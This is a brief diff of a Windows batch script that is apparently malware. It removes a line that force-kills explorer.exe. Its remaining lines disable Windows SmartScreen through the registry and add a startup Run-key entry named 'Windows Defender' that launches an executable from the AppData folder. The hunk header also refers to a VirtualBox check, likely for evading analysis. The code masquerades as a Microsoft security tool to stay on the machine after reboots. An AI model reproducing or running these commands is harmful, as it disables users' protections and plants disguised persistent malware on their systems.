@@ -13,7 +13,6 @@ if "%model%" == "VirtualBox" (
 
 cd %~dp0
 
-taskkill /f /im explorer.exe
 REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f       
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%AppData%\Microsoft\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
